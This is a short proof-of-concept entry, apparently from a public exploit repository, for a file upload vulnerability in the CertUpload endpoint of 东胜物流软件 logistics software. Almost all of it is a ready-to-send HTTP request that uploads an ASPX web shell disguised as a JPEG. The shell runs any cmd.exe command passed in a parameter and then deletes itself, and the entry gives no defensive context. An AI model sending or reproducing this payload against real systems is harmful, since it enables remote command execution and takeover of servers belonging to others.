# ds_CertUpload_fileupload

from: https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6CertUpload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
product: 东胜物流软件

```
POST /MsWlTruck/CertUpload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown

------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="TruckNo";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="Cert_Type";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
```
